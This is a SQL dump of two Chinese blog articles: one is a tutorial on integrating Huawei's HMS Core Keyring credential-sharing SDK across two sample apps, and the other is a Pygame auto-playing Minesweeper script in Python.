INSERT INTO `article` VALUES (5, '代码实战，一文教你集成钥匙环服务', 4, '概述', '<p>华为钥匙环服务是HMS Core在安全领域的开放能力，为国内外开发者提供跨应用、跨形态共享用户认证凭据的功能，帮助开发者为用户构建一处登录、处处登录的无缝体验。</p>\n<p>本篇文章将详细为开发者介绍，集成钥匙环服务需要做哪些准备，以及样例代码是如何集成钥匙环服务，并实现相关功能的。满篇干货，建议收藏。</p>\n<h1><strong>1 准备工作</strong></h1>\n<p>在集成钥匙环服务SDK之前，开发者需要进行一些通用的集成准备工作。</p>\n<p>1.1 第一步，配置AppGallery Connect，详细步骤参考资料：<a href=\"https://developer.huawei.com/consumer/cn/doc/development/Security-Guides/config-agc-0000001181242769\">配置信息</a>。</p>\n<p>1.2 第二步，创建Android Studio工程，并配置Maven仓库地址。针对Android Studio开发环境，华为提供了Maven仓集成方式的HMS Core SDK包。在开始开发前，您需要将HMS Core SDK集成到您的Android Studio开发环境中。参考资料：<a href=\"https://developer.huawei.com/consumer/cn/doc/development/Security-Guides/hms-core-0000001208048739\">集成HMS Core SDK</a>。</p>\n<p>1.3 第三步，在编译APK前，您需要配置混淆配置文件，避免混淆HMS Core SDK导致功能异常。参考资料：<a href=\"https://developer.huawei.com/consumer/cn/doc/development/Security-Guides/config-obfuscation-scripts-0000001181234351\">配置混淆脚本</a>。</p>\n<h1><strong>2 集成钥匙环服务SDK</strong></h1>\n<p>集成HMS Core的基础准备工作完成之后，我们来看下如何集成&ldquo;钥匙环服务SDK&rdquo;。</p>\n<h2>2.1 打开工程中模块级的build.gradle文件</h2>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/303/188/248/0070086200303188248.20211130092710.23224765793327087659896635616966:50521129020407:2800:37A0712C4836DE18155015DE734AEC14DEB1265B8189F3995C2B28F3FD4A842C.png\" alt=\"11.png\" /></span></p>\n<h2>2.2 在dependencies中添加对钥匙环服务SDK的依赖</h2>\n<p>在build.gradle文件中找到dependencies配置项，在其中加入对&ldquo;钥匙环服务SDK&rdquo;的依赖配置，然后点击&ldquo;同步项目&rdquo;按钮，让Android Studio完成相关的下载及准备工作。</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/303/188/248/0070086200303188248.20211130092720.97631261614418284329360887735719:50521129020407:2800:0B1D45B4F32259797E0BFD9FEB750DCB38C6CA754ABE13CFBD3C608F30F51EA2.png\" alt=\"12.png\" /></span></p>\n<h1><strong>3&nbsp;样例代码模拟的场景说明</strong></h1>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/303/188/248/0070086200303188248.20211130092729.15746277910387948924143357790743:50521129020407:2800:03FCCE2B2ECF62F07EC7EE420FFDF7F1A652E65B8BBCAD4ED20A68F8A7932519.png\" alt=\"13.png\" /></span></p>\n<p>样例代码中，提供了2个App，分别是App 1和App 2。</p>\n<p>App1模拟登录操作，调用钥匙环服务的接口，保存用户登录凭据。同时，将凭据共享给App 2。</p>\n<p>App 2则调用钥匙环服务的接口，查询可用凭据，并调用获取凭据内容接口来直接取得用户登录口令。</p>\n<p>为了让样例代码可以运行起来，我们需要在AppGallery中分别创建2个应用，并分别下载应用的agconnect-services.json文件放置到App 1和App 2的Android Studio工程中，部分的操作可以参考前面1 准备工作。</p>\n<h1>4&nbsp;准备信息材料</h1>\n<p>我们还需要准备一些信息材料，在后面的环节中会需要使用。</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/303/188/248/0070086200303188248.20211130092742.83203199231527887649289259247902:50521129020407:2800:836802391ECD7EFCF02CFCEA47B59F618156E45E9E6FAA8114790A9B10ADF395.png\" alt=\"15.png\" /></span></p>\n<p>由于我们需要在App 1和App 2的代码中设置共享关系，所以我们需要查询并记录App 1和App 2的包名及签名证书指纹。获取签名证书指纹的方法，也可以参考前面1 准备工作。</p>\n<h1>5&nbsp;实战及演示视频</h1>\n<h2>5.1&nbsp;App 1如何使用钥匙服务SDK保存凭据。</h2>\n<div class=\"ckeditor-video video-align-center\">\n<div id=\"vjs_video_3\" class=\"video-js vjs-16-9 vjs-paused vjs-controls-enabled vjs-workinghover vjs-v7 vjs-user-active vjs_video_3-dimensions\" lang=\"cn\" tabindex=\"-1\" role=\"region\" aria-label=\"Video Player\"><video id=\"vjs_video_3_html5_api\" class=\"vjs-tech\" tabindex=\"-1\" role=\"application\" poster=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/303/188/248/0070086200303188248.20211130100612.65039197435884526088054651980793:50521201143714:2800:B08A8A0A261357FA0A617FEBC2C5A24D577F2836F12BD141C20963042A2455FA.png\" width=\"300\" height=\"150\" data-mce-fragment=\"1\"></video>\n<div class=\"vjs-poster\" tabindex=\"-1\" aria-disabled=\"false\">&nbsp;</div>\n<div class=\"vjs-text-track-display\" aria-live=\"off\" aria-atomic=\"true\">\n<div>&nbsp;</div>\n</div>\n<button class=\"vjs-big-play-button\" title=\"Play Video\" type=\"button\" aria-disabled=\"false\"><span class=\"vjs-control-text\" aria-live=\"polite\">Play Video</span></button></div>\n</div>\n<p>App 1模拟了一个公司旗下的一款应用的帐号登录环节。</p>\n<p>在演示视频中，开发者可以看到该工程只有一个Activity，即MainActivity，其中大部分的代码都是为了实现界面效果，以及基本的登录处理逻辑。MainActivity有一个CredentialClient类型的成员对象，该对象是访问钥匙环服务的操作对象，在Activity的onCreate方法中进行初始化。</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/303/188/248/0070086200303188248.20211130092753.78084945537738580285047614507538:50521129020407:2800:187E7FCAB50AD18BD2F482A63ECE8D106DDF5E8445CF948B70D3AA9AA8990E63.png\" alt=\"16.png\" /></span></p>\n<p>接下来演示视频介绍了<strong>登录</strong>按钮的onClick处理方法login的实现。</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/303/188/248/0070086200303188248.20211130092801.49207250317742117509278971680943:50521129020407:2800:7C4754B6E7E58C429CB4FA73AA86DDB8A0405828291032813E9B58E9805CE102.png\" alt=\"17.png\" /></span></p>\n<p>在login方法的开头，调用checkInput方法进行了用户名和口令输入框内容的有效性检查。一般来说，业务逻辑会连接后台，使用用户名和口令进行登录。视频的样例省略了这部分的模拟代码，这里就假设用户名和口令都是正确的，在后台可以登录成功。</p>\n<p>那么接下来，便会调用saveCredential方法，对凭据进行保存。saveCredential方法是为了突出入参而简单封装的一个便利方法。入参有用户名、口令、共享目标App相关信息以及读取该凭据内容时是否需要用户认证的配置。</p>\n<p>这里需要用上开发者在前面章节准备的App 2的包名和证书指纹。在调用saveCredential方法时，需要将App 2的包名和证书指纹作为参数传入。</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/303/188/248/0070086200303188248.20211130092814.10227038051696743157431884684309:50521129020407:2800:9BAFC81223AE890EC44D32E7624D9783D6FEE74DF596610A9F2A10450BE3D73C.png\" alt=\"18.png\" /></span></p>\n<p>在saveCredential方法中，我们先使用App 2的包名和证书指纹，创建了一个应用对象app2。接着，将该对象放入一个AppIdentity的列表sharedAppList中，作为凭据的共享App列表参数使用。然后，我们创建了一个口令类型的凭据对象。并调用该对象的一系列set方法，设置凭据的共享App列表及其他一些配置。最后，调用钥匙环服务操作对象mCredentialClient的saveCredential方法，对该凭据进行保存操作。并设置成功和失败的回调通知方法。</p>\n<p>至此，开发者便可以将凭据保存到钥匙环服务中。</p>\n<h2>5.2&nbsp;App 2如何操作钥匙环服务SDK来查询凭据，并提取凭据内容。</h2>\n<div class=\"ckeditor-video video-align-center\">\n<div id=\"vjs_video_505\" class=\"video-js vjs-16-9 vjs-paused vjs-controls-enabled vjs-workinghover vjs-v7 vjs-user-active vjs_video_505-dimensions\" lang=\"cn\" tabindex=\"-1\" role=\"region\" aria-label=\"Video Player\"><video id=\"vjs_video_505_html5_api\" class=\"vjs-tech\" tabindex=\"-1\" role=\"application\" poster=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/303/188/248/0070086200303188248.20211130100636.69092313671580350751063560255330:50521201143714:2800:284C4FAC2062197B20FAEEAA9B963660595A990B5DE9BC44F771752255C1B2A7.png\" width=\"300\" height=\"150\" data-mce-fragment=\"1\"></video>\n<div class=\"vjs-poster\" tabindex=\"-1\" aria-disabled=\"false\">&nbsp;</div>\n<div class=\"vjs-text-track-display\" aria-live=\"off\" aria-atomic=\"true\">\n<div>&nbsp;</div>\n</div>\n<button class=\"vjs-big-play-button\" title=\"Play Video\" type=\"button\" aria-disabled=\"false\"><span class=\"vjs-control-text\" aria-live=\"polite\">Play Video</span></button></div>\n</div>\n<p>App 2模拟了该公司旗下的另一款应用的帐号登录环节。</p>\n<p>App 2可以通过钥匙环服务SDK查询自己之前保存的以及指定App共享给自己的凭据，提取凭据内容进行无缝登录。在App 2中，也只有一个Activity，即MainActivity，模拟了登录界面。和App 1类似，App 2也定义了一个CredentialClient类型的成员对象mCredentialClient，作为访问钥匙环服务的操作对象。同样地，也是在Activity的onCreate方法中进行初始化。在onCreate方法的末尾，调用了queryCredential方法来查询可用凭据。</p>\n<p>下面介绍queryCredential方法的实现。</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/303/188/248/0070086200303188248.20211130092828.05518227238732485710620193684229:50521129020407:2800:36FD8004228F546D934993F1F402A605DC0FC27B3F8E40E056985AFC8C991516.png\" alt=\"19.png\" /></span></p>\n<p>在之前的准备环节中，我们记录了App 1的包名和证书指纹。在queryCredential方法中，我们使用这些信息来创建一个代表App 1的AndroidAppIdentity对象。创建完成之后，放入一个AppIdentity列表trustedOwnerList中，后面作为&ldquo;可信凭据属主列表&rdquo;参数来使用。</p>\n<p>接下来，调用钥匙环服务操作对象mCredentialClient的findCredential接口，传入&ldquo;可信凭据属主列表&rdquo;和结果通知回调对象。findCredential接口会查询出本App可用的凭据，包括：本应用保存的凭据，以及&ldquo;可信凭据属主列表&rdquo;中的应用共享给本应用的凭据。在App 2的样例代码中，findCredential会查询App 2自身保存的凭据和App 1共享给自己的凭据。</p>\n<p>如果onSuccess回调方法被调用，并且credentials参数不是空列表，则说明有可用凭据。那么便会调用setCredentialList方法，把凭据列表放置到界面的RecyclerView组件中进行展示。</p>\n<p>在演示视频中可以看到，在CredentialHolder类的实现中，当界面展示出的某个凭据列表条目被选中时，会调用choose方法，choose方法中，会将选中的凭据对象赋值给mChooseCredential成员变量。在用户点击了界面的&ldquo;登录&rdquo;按钮后，会调用login方法。</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/303/188/248/0070086200303188248.20211130092838.62311288542899105206443741818618:50521129020407:2800:C576F254CF80A5853084402F5E414459D35E66A0AD876B73F37E27E03EAB4317.png\" alt=\"20.png\" /></span></p>\n<p>在login方法中，如果mChooseCredential不为空，则会调用这个被选中凭据对象的getContent方法来尝试获取凭据。在调用该接口时，还需要传入结果通知回调对象。</p>\n<p>在onSuccess回调方法中，bytes参数就是凭据内容的原文，即App 1保存的用户登录口令。在真实的应用中，我们便可以使用该登录口令直接进行登录，实现无缝登录的效果。</p>\n<p>本篇集成钥匙环服务实战到这里就讲解完毕，欢迎广大开发者进入<a href=\"https://developer.huawei.com/consumer/cn/doc/development/Security-Guides/introduction-0000001133141068\">华为钥匙环服务的官网</a>，获取更多开发指南相关信息。</p>', '', 5, ',4,28,', '原创', '公开', '已发布', '精华', 4982, '', '', 0, '2021-12-02 22:38:49', '2021-12-02 22:38:49');
INSERT INTO `article` VALUES (6, 'Pygame小游戏：玩扫雷就在瞎点的，不止你一个人。', 3, '概述', '<p>前言<br />《扫雷》是一款大众类的益智小游戏，于1992年发行。</p>\n<p>游戏目标是在最短的时间内根据点击格子出现的数字找出所有非雷格子，同时避免踩雷，踩到一个</p>\n<p>雷即全盘皆输。</p>\n<p>&nbsp;</p>\n<p>它是许多人接触到的第一款游戏，大概也是广大办公族和无网学生无聊时消遣的最佳游戏，是不是</p>\n<p>每次见到戴上墨镜的小人很有成就感？在那些还没有网（被切断网）的岁月，扫雷曾陪伴无数人度</p>\n<p>过了他们的童年。你的最佳纪录是多少？小编在工作间隙随手刷了一局30秒(囧😳)。</p>\n<p>那么？怎么才能通关呢？这，有生之年靠自己猜可能做不到了，BUT我们可以靠一靠我们的Python自动扫雷的嘛！不要慌呢~我们正式开始吧！</p>\n<p>&nbsp;</p>\n<p>《自动扫雷》<br />环境配置：<br />Python3、 Pycharm 、Pygame以及部分自带的模块。</p>\n<p>第三方库的安装：pip install pygame</p>\n<p>效果展示:<br />游戏开始：</p>\n<p>&nbsp;</p>\n<p>自动扫雷：</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>游戏结束：</p>\n<p>&nbsp;</p>\n<p>代码演示：<br />1）主程序</p>\n<p>代码比较多哈，每行都有注释大家自己看，不懂的可以找我交流、一起学习嘛！</p>\n<p># -*- coding: utf-8 -*- <br />import pygame<br />from pygame.locals import *<br />import numpy as np<br />import random<br />import sys<br />import time<br />import copy<br /><br /><br /># 屏幕大小<br />Screen_Size = (1200, 600)<br /># 行数<br />Rows = 20<br /># 列数<br />Colums = 40<br /># 雷的数量<br />numOfMines = 80<br /># 胜率<br />VictoryRate=0<br /><br />class Sweep(object):<br />\"\"\"docstring for Sweep\"\"\"<br /><br />def __init__(self):<br /># 初始化一个页面<br />self.Screen = pygame.display.set_mode(Screen_Size)<br /># 字体<br />self.myfont = pygame.font.SysFont(\'幼圆\', 25)<br /># 格子大小<br />self.gwide = int(Screen_Size[0] / Colums)<br />self.gheight = int(Screen_Size[1] / Rows)<br />self.board = np.zeros((Rows, Colums))<br /># 存储下一步可选的位置<br />self.NBS = []<br /># NBS辅助容器，用于判断NBS有没变化<br />self.NBSTool = []<br /># 判断是否进行概率选择扫雷<br />self.GO = False<br /># 遍历存储容器<br />self.container = []<br /># 标注地雷存储容器<br />self.mineContainer = []<br /># 实际地雷位置存储容器<br />self.Mines = []<br /># 数字存储容器<br />self.numbers = []<br /># 加载图片<br />self.LoadImg()<br /># 画格子<br />self.DrawGrid()<br /># 埋雷<br />self.HideMines()<br /><br />def LoadImg(self):<br /># 加载地雷图片<br />self.mine = pygame.image.load(\'image/mine.jpg\').convert_alpha()<br />self.mine = pygame.transform.scale(<br />self.mine, (self.gwide, self.gheight))<br /># 加载旗子图片<br />self.flag = pygame.image.load(\'image/flag.jpg\').convert_alpha()<br />self.flag = pygame.transform.scale(<br />self.flag, (self.gwide, self.gheight))<br /># 加载地雷爆炸图片<br />self.boom = pygame.image.load(\'image/boom.png\').convert_alpha()<br />self.boom = pygame.transform.scale(<br />self.boom, (self.gwide, self.gheight))<br /># 加载数字图片<br />self.num1 = pygame.image.load(\'image/1.png\')<br />self.num1 = pygame.transform.scale(<br />self.num1, (self.gwide, self.gheight))<br />self.num2 = pygame.image.load(\'image/2.png\')<br />self.num2 = pygame.transform.scale(<br />self.num2, (self.gwide, self.gheight))<br />self.num3 = pygame.image.load(\'image/3.png\')<br />self.num3 = pygame.transform.scale(<br />self.num3, (self.gwide, self.gheight))<br />self.num4 = pygame.image.load(\'image/4.png\')<br />self.num4 = pygame.transform.scale(<br />self.num4, (self.gwide, self.gheight))<br />self.num5 = pygame.image.load(\'image/5.png\')<br />self.num5 = pygame.transform.scale(<br />self.num5, (self.gwide, self.gheight))<br />self.num6 = pygame.image.load(\'image/6.png\')<br />self.num6 = pygame.transform.scale(<br />self.num6, (self.gwide, self.gheight))<br />self.num7 = pygame.image.load(\'image/7.png\')<br />self.num7 = pygame.transform.scale(<br />self.num7, (self.gwide, self.gheight))<br />self.num8 = pygame.image.load(\'image/8.png\')<br />self.num8 = pygame.transform.scale(<br />self.num8, (self.gwide, self.gheight))<br /># 加载访问过后设置背景图<br />self.back = pygame.image.load(\'image/back.jpg\')<br />self.back = pygame.transform.scale(<br />self.back, (self.gwide, self.gheight))<br /># 加载游戏失败背景<br />self.gameOver=pygame.image.load(\'image/gameover.jpg\')<br />self.gameOver=pygame.transform.scale(self.gameOver,Screen_Size)<br /># 加载游戏胜利背景<br />self.victoryOver=pygame.image.load(\'image/victory.jpg\')<br />self.victoryOver=pygame.transform.scale(self.victoryOver,Screen_Size)<br /><br />def HideMines(self):<br />\"\"\"埋雷\"\"\"<br />for i in range(numOfMines):<br />while True:<br />y = random.randint(0, Colums - 1)<br />x = random.randint(0, Rows - 1)<br />if self.board[x][y] == 0:<br />self.board[x][y] = -1<br />self.Mines.append((x, y))<br />break<br /><br />def ShowAllMines(self):<br />\"\"\"<br />显示所有地雷的位置<br />\"\"\"<br />for i in range(Rows):<br />for j in range(Colums):<br />if self.board[i][j] == -1:<br />self.Screen.blit(<br />self.mine, (self.gwide * j, self.gheight * i))<br /><br />def DrawGrid(self):<br />\"\"\"<br />绘制背景界面<br />\"\"\"<br />self.Screen.fill((191, 251, 255))<br /># 画横线<br />for i in range(1, Rows):<br />pygame.draw.line(<br />self.Screen, (0, 0, 0), (0, self.gheight * i), (Screen_Size[0], self.gheight * i))<br /># 画竖线<br />for i in range(1, Colums):<br />pygame.draw.line(self.Screen, (0, 0, 0),<br />(self.gwide * i, 0), (self.gwide * i, Screen_Size[1]))<br /><br />def NumOfPos(self, pos):<br />\"\"\"<br />返回一个点周围的地雷数<br />pos为地图坐标<br />同时在二维数组对应位置设置地雷数<br />\"\"\"<br />n = 0<br />y, x = pos[0], pos[1]<br />if x - 1 &gt;= 0:<br />if self.board[x - 1][y] == -1:<br />n += 1<br />if y - 1 &gt;= 0 and self.board[x - 1][y - 1] == -1:<br />n += 1<br />if y + 1 &lt;= Colums - 1 and self.board[x - 1][y + 1] == -1:<br />n += 1<br />if x + 1 &lt;= Rows - 1:<br />if self.board[x + 1][y] == -1:<br />n += 1<br />if y - 1 &gt;= 0 and self.board[x + 1][y - 1] == -1:<br />n += 1<br />if y + 1 &lt;= Colums - 1 and self.board[x + 1][y + 1] == -1:<br />n += 1<br />if y - 1 &gt;= 0 and self.board[x][y - 1] == -1:<br />n += 1<br />if y + 1 &lt;= Colums - 1 and self.board[x][y + 1] == -1:<br />n += 1<br /># self.board[x][y] = n<br />return n<br /><br />def SetNumOfPos(self, pos):<br />\"\"\"<br />设置一个安全点周围地雷的数量<br />pos是地图坐标<br />\"\"\"<br />n = self.NumOfPos(pos)<br />if n == 0:<br />self.Screen.blit(<br />self.back, (self.gwide * pos[0], self.gheight * pos[1]))<br />if n == 1:<br />self.Screen.blit(<br />self.num1, (self.gwide * pos[0], self.gheight * pos[1]))<br />if n == 2:<br />self.Screen.blit(<br />self.num2, (self.gwide * pos[0], self.gheight * pos[1]))<br />if n == 3:<br />self.Screen.blit(<br />self.num3, (self.gwide * pos[0], self.gheight * pos[1]))<br />if n == 4:<br />self.Screen.blit(<br />self.num4, (self.gwide * pos[0], self.gheight * pos[1]))<br />if n == 5:<br />self.Screen.blit(<br />self.num5, (self.gwide * pos[0], self.gheight * pos[1]))<br />if n == 6:<br />self.Screen.blit(<br />self.num6, (self.gwide * pos[0], self.gheight * pos[1]))<br />if n == 7:<br />self.Screen.blit(<br />self.num7, (self.gwide * pos[0], self.gheight * pos[1]))<br />if n == 8:<br />self.Screen.blit(<br />self.num8, (self.gwide * pos[0], self.gheight * pos[1]))<br />return n<br /><br />def NeighborsOf(self, pos):<br />\"\"\"<br />获取一个点的邻居坐标<br />pos为二维数组的坐标<br />\"\"\"<br />x, y = pos[0], pos[1]<br />neibors = []<br />if x - 1 &gt;= 0:<br />if y - 1 &gt;= 0:<br />neibors.append((x - 1, y - 1))<br />if y + 1 &lt;= Colums - 1:<br />neibors.append((x - 1, y + 1))<br />neibors.append((x - 1, y))<br />if x + 1 &lt;= Rows - 1:<br />if y - 1 &gt;= 0:<br />neibors.append((x + 1, y - 1))<br />if y + 1 &lt;= Colums - 1:<br />neibors.append((x + 1, y + 1))<br />neibors.append((x + 1, y))<br />if y - 1 &gt;= 0:<br />neibors.append((x, y - 1))<br />if y + 1 &lt;= Colums - 1:<br />neibors.append((x, y + 1))<br />return neibors<br /><br />def Boom(self, pos):<br />\"\"\"<br />pos为二维数组位置<br />\"\"\"<br />self.Screen.blit(<br />self.boom, (self.gwide * pos[1], self.gheight * pos[0]))<br /># pygame.display.update()<br /><br />def Ergodic(self, pos):<br />\"\"\"<br />从一个位置向四周发散直到遇到有雷的位置结束,是一个递归函数<br />pos是二维数组的坐标<br />将二维数组pos坐标和周围的地雷数存入容器self.container中<br />\"\"\"<br />x, y = pos[0], pos[1]<br /># 如果该位置周围地雷数不为0，停止<br />if self.NumOfPos((y, x)) &gt; 0 and self.board[x][y] != -1:<br />self.numbers.append(pos)<br />return<br /># 将二维数组pos坐标和周围的地雷数存入容器self.container中<br />if self.board[x][y] != -1:<br />self.container.append(pos)<br /># 向上遍历<br />if x - 1 &gt;= 0 and (x - 1, y) not in self.container:<br />self.Ergodic((x - 1, y))<br /># 向下遍历<br />if x + 1 &lt;= Rows - 1 and (x + 1, y) not in self.container:<br />self.Ergodic((x + 1, y))<br /># 想左遍历<br />if y - 1 &gt;= 0 and (x, y - 1) not in self.container:<br />self.Ergodic((x, y - 1))<br /># 箱右遍历<br />if y + 1 &lt;= Colums - 1 and (x, y + 1) not in self.container:<br />self.Ergodic((x, y + 1))<br /><br />def DrawContainer(self):<br /># self.ShowAllMines()<br />for pos in self.container:<br />x, y = pos[0], pos[1]<br />self.SetNumOfPos((y, x))<br /><br />def DrawNumbers(self):<br />for pos in self.numbers:<br />self.SetNumOfPos((pos[1], pos[0]))<br /><br />def DrawFlags(self):<br />for pos in self.mineContainer:<br />self.Screen.blit(<br />self.flag, (pos[1] * self.gwide, pos[0] * self.gheight))<br /><br />def Removed(self):<br />n = 0<br />for pos in self.mineContainer:<br />if pos in self.Mines:<br />n += 1<br />return n<br /><br />def AutoPlay(self):<br /># 二维数组随机位置<br />x = random.randint(0, Rows - 1)<br />y = random.randint(0, Colums - 1)<br />print(\"第一步：\",self.board[x][y])<br />if self.board[x][y]==-1:<br />self.Boom((x,y))<br />pygame.display.update()<br />self.GameOver()<br />print(x, y)<br />while True:<br />for ev in pygame.event.get():<br />if ev.type == pygame.QUIT:<br />sys.exit(0)<br />if self.board[x][y] == -1:<br />self.Boom((x, y))<br />time.sleep(3)<br />sys.exit(0)<br /># 画格子<br />self.DrawGrid()<br /># 向四周发散遍历<br />self.Ergodic((x, y))<br /># 画已经遍历过且周围没雷的位置（用白色背景）<br />self.DrawContainer()<br /># 画已经遍历过但周围有雷的位置（用数字）<br />self.DrawNumbers()<br /># 找出下一步可能走的所有位置<br />self.NextSteps()<br /># 画已经标注过的地雷的位置（用旗子）<br />self.DrawFlags()<br /># 找出一定是地雷的位置并标注（用旗子）<br />self.SetFlags()<br /># 找出一定没雷的位置标注（数字或空白）<br />self.NoMines()<br /># NBS为0时，概率选择<br />self.ChooseWithBigProbability()<br /># 刷新<br />pygame.display.update()<br /># 打印被标注的地雷数<br />print(\"被标注的地雷数：\", len(self.mineContainer))<br />print(\"被排除的地雷数：\", self.Removed())<br />if self.Removed()==numOfMines:<br />time.sleep(3)<br />self.Victory()<br /><br />def NextSteps(self):<br />\"\"\"<br />找出下一步扫雷的可选择位置<br />算法思想：<br />找出每个已被标明周围地雷数的位置的八邻域诶被访问过<br />的位置，这些位置就是下一步可能走的位置<br />\"\"\"<br />self.NBS.clear()<br />for pos in self.numbers:<br />for n in self.NeighborsOf(pos):<br />if n not in self.NBS + self.container + self.numbers:<br />self.NBS.append(n)<br />if self.NBSTool == self.NBS:<br />print(self.GO)<br />self.GO = True<br />self.NBSTool = copy.deepcopy(self.NBS)<br /># print(self.NBS)<br /><br />def SetFlags(self):<br />\"\"\"<br />找出一定有雷的位置并用旗子标注<br />算法思想：<br />对每个已经标明过地雷数的位置，找出该位置八邻域还没有访问过的位置，<br />找出还没发现的地雷数目，如果该位置周围还没发现的地雷数大于等于可<br />走的位置数目，那么该位置剩余八邻域可走位置必定全为地雷，标注该位置<br />为地雷，并放入self.mineContainer容器<br />\"\"\"<br />for pos in self.numbers:<br />s = list(set(self.NeighborsOf(pos)) -<br />set(self.container) - set(self.numbers) - set(self.mineContainer))<br />s1 = list(set(self.NeighborsOf(pos)) -<br />set(self.container) - set(self.numbers))<br /># if self.NumOfPos((pos[1], pos[0])) == 1 and len(s) == 1:<br />if self.NumOfPos((pos[1], pos[0])) - len(set(s1) &amp; set(self.mineContainer)) &gt;= len(s):<br />if self.board[pos[0]][pos[1]] == -1:<br />self.Boom(pos)<br />time.sleep(3)<br />sys.exit(0)<br />for pos1 in s:<br />self.mineContainer.append(pos1)<br />self.Screen.blit(<br />self.flag, ((self.gwide * pos1[1], self.gheight * pos1[0])))<br /># time.sleep(1)<br /># pygame.display.update()<br /><br />def NoMines(self):<br />\"\"\"<br />找出能确定没有地雷的位置<br />算法思想：<br />对于每个已被标明周围地雷数的位置，找出该位置八邻域内剩下<br />未访问过的位置，查看当前位置周围的地雷是否被全部标记了，<br />如果已经全部被标记，那么该位置八邻域内剩下未访问过的位置<br />，如果位置周围的地雷数为0，那么用Ergodic()函数遍历，如果<br />位置周围地雷数不为0，那么标明该位置的地雷数<br />\"\"\"<br />for pos in self.numbers:<br />s = list(set(self.NeighborsOf(pos)) -<br />set(self.container) - set(self.numbers) - set(self.mineContainer))<br />if self.NumOfPos((pos[1], pos[0])) == len(set(self.NeighborsOf(pos)) &amp; set(self.mineContainer)):<br />for pos1 in s:<br />if self.board[pos1[0]][pos1[1]] == -1:<br />self.mineContainer.append(pos)<br />continue<br />if self.NumOfPos((pos1[1], pos1[0])) == 0:<br />self.container.append(pos1)<br />self.Ergodic(pos1)<br />self.Screen.blit(<br />self.back, (pos1[1] * self.gwide, pos1[0] * self.gheight))<br />continue<br />if self.NumOfPos((pos1[1], pos1[0])) &gt; 0:<br />self.SetNumOfPos((pos1[1], pos1[0]))<br />self.numbers.append(pos1)<br /># self.DrawContainer()<br /># pygame.display.update()<br /><br />def ChooseWithBigProbability(self):<br />\"\"\"<br />概率选择函数<br />算法思想：<br />当遇到无法肯定有雷或无雷的情况时，找出还没有被访问过的位置<br />找出这些位置八邻域内已被标明地雷数的位置的地雷数的和，并用<br />和除以8，将这些位置和其对应的概率存入容器并按概率从大到小的<br />顺序排序，如果概率最大的位置的概率大于等于0.75，那么将该位置<br />标注为地雷，如果概率小于0.75，那么找出还未访问过且不在下一步<br />计划的位置容器的位置，随机选择一个位置，如果踩到雷游戏结束，<br />如果该位置周围没有地雷，则调用Ergodic()遍历，如果周围有地雷<br />那么标注该位置的地雷数<br />\"\"\"<br />if self.GO == True:<br />print(\"进入概率选择环境\")<br />noSeen = []<br /># 待排雷数量<br />leftmines=numOfMines-self.Removed()<br /># 找出还未遍历过的位置<br />for i in range(Rows):<br />for j in range(Colums):<br />if (i, j) not in self.container + self.mineContainer + self.numbers:<br />s = list(set(self.NeighborsOf((i, j)))<br />&amp; set(self.numbers))<br />numerator = 0<br />for s1 in s:<br />numerator += self.NumOfPos((s1[1], s1[0]))<br /># 计算概率<br />noSeen.append([(i, j), numerator / 8])<br />sorted(noSeen, key=lambda proba: proba[1], reverse=True)<br />if noSeen != []:<br />if noSeen[0][1] &gt;= 0.75:<br />pos = noSeen[0][0]<br />self.mineContainer.append(pos)<br />else:<br />nos = [p[0] for p in noSeen]<br />s = list(set(nos) - set(self.NBS))<br />index = 0<br />pos = (-1, -1)<br />if len(s) &gt; 1:<br />index = random.randint(0, len(s) - 1)<br />pos = s[index]<br />elif len(s) == 1:<br />pos = s[0]<br />elif s == []:<br />pos = noSeen[0][0]<br />if self.board[pos[0]][pos[1]] == -1:<br />self.Boom(pos)<br />time.sleep(2)<br />self.GameOver()<br />elif self.NumOfPos((pos[1], pos[0])) &gt; 0:<br />self.numbers.append(pos)<br />elif self.NumOfPos((pos[1], pos[0])) == 0:<br />self.Ergodic(pos)<br /><br />noSeen.clear()<br />self.GO = False<br /><br />def GameOver(self):<br />for pos in self.Mines:<br />self.Boom(pos)<br />pygame.display.update()<br />time.sleep(0.1)<br />self.Screen.blit(self.gameOver,(0,0))<br />VictoryRate=content=\"排雷率：%d\"%((self.Removed()/numOfMines)*100)<br />text=self.myfont.render(content+\'%\',True,(0,0,0),(255,255,255))<br />self.Screen.blit(text,(500,150))<br />pygame.display.update()<br />time.sleep(5)<br />sys.exit(0)<br /><br />def Victory(self):<br /># if self.Removed()==numOfMines:<br />VictoryRate=100<br />self.Screen.blit(self.victoryOver,(0,0))<br />pygame.display.update()<br />time.sleep(5)<br />sys.exit(0)<br /><br />def Show(self):<br />self.DrawGrid()<br />self.ShowAllMines()<br />pygame.display.update()<br />time.sleep(5)<br />self.DrawGrid()<br />pygame.display.update()<br />time.sleep(3)<br />while True:<br />for ev in pygame.event.get():<br />if ev.type == pygame.QUIT:<br />sys.exit(0)<br />self.AutoPlay()<br />pygame.display.update()<br /><br /><br />if __name__ == \'__main__\':<br />pygame.display.init()<br />pygame.font.init()<br />app = Sweep()<br />app.Show()<br />结尾<br 